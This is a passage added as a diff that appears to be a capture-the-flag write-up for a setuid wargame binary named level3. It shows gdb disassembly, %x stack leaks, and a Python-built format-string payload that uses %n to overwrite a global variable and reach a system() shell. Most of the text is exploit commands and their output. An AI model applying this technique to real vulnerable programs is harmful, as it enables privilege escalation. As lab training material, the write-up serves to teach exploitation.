@@ -1,0 +1,94 @@
+ll
+|
+L-> -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3*
+
+./level3
+
+wait for an input
+and copy back it
+
+I tried some long string with python but it only print some char (511 + enter = 512)
+
+lets disass it
+
+gdb level3
+
+(gdb) disass main
+|
+L-> 0x08048520 <+6>:     call   0x80484a4 <v>
+
+(gdb) disass v
+|
+L-> 0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
+
+ok so it use fget we also see:
+
+0x080484df <+59>:    cmp    $0x40,%eax
+0x080484e2 <+62>:    jne    0x8048518 <v+116>
+
+just after a printf wo juste go to leave-ret
+but if we bypass it we go to
+
+0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
+0x0804850c <+104>:   movl   $0x804860d,(%esp)
+0x08048513 <+111>:   call   0x80483c0 <system@plt>
+
+so let's try to go here
+
+(gdb) break *0x080484e2
+(gdb) break system
+
+r
+
+(gdb) set $eax = 0x40
+
+s
+|
+L-> Wait what?!
+
+type enter another time and we got a shell !
+
+id
+|
+L-> uid=2022(level3) gid=2022(level3) groups=2022(level3),100(users)
+
+we still as level3 so we can't get the pass from the debugger
+so we need to execute it outside the debugger and try to set eax to 0x40 at the right time
+
+so we remember that before the cmp    $0x40,%eax we have
+mov    0x804988c,%eax
+
+so we need to override 0x804988c address to be 0x40
+
+we will try to see if printf can be exploited to print address
+
+./level3
+%x %x
+|
+L-> 200 b7fd1ac0
+
+oooh interresting so we will try now to find 804988c
+
+./level3
+aa %x %x %x %x %x %x
+|
+L-> aa 200 b7fd1ac0 b7ff37d0 25206161 78252078 20782520
+
+we see thatfrom the 4th %x the address is different let's try to override it (https://www.bases-hacking.org/ecrire-memoire.html)
+
+python -c 'print "\x8c\x98\x04\x08" + "%x %x %x %x"' | ./level3
+|
+L-> 200 b7fd1ac0 b7ff37d0 804988c
+
+here we go we got access to the address no we need to set his value to 0x40 (64)
+our address \x8c\x98\x04\x08 is 4 byte long so we just need to add 60 random char 
+
+we need to edit the value on t his adress so the last %x will turn into %n if we count, the format "%x %x %x " will be (200 b7fd1ac0 b7ff37d0 ) 22 char long
+ 60 - 22 = 38
+so we will have 
+
+python -c 'print "\x8c\x98\x04\x08" + "a"*38 + "%x %x %x %n"' > /tmp/exploit
+
+cat /tmp/exploit - | ./level3
+
+here we go we got a shell
